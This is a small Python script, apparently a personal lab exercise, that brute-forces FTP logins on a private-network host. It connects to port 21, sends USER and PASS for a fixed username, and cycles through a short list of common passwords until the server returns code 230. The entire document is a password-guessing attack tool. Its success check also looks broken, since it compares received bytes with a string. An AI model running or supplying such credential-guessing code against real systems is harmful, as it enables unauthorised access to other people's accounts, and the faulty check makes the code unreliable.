#! /usr/bin/python


import socket
import sys
import re


IP_ADDRESS = '192.168.84.137'
PORT = 21
clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# attempt to connect to ftp server
def connection(uname, password):

    # specify address family --
        # socket.AF_INET = ip family for IPV4
        # socket.SOCK_STREAM = TCP socket type

    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    
    s = clientSocket
    
    # shows the current credential combo
    print('[*] trying ' + uname + ':' + password)

    # attempt connecting to ftp 
    s.connect((IP_ADDRESS, PORT))

    # recieve response in 1024 bytes
    response = s.recv(1024)

    s.send(('USER ' + uname + '\r\n').encode())

    response = s.recv(1024)

    s.send(('PASS '+ password + '\r\n').encode())

    response = s.recv(3)

    s.send(('QUIT\r\n').encode())


    return response

# static for my vm
uname = 'abc'

# super small list, just trying to verify it is functional
passwords = ['abc', 'abc123', 'password123', 'yuck','123']

# lil loop
for password in passwords:
    attempt = connection(uname, password)
    if attempt=='230':
        print('[*] Congrats, password is:' + password)
        sys.exit(0)
    # else:
        # continue


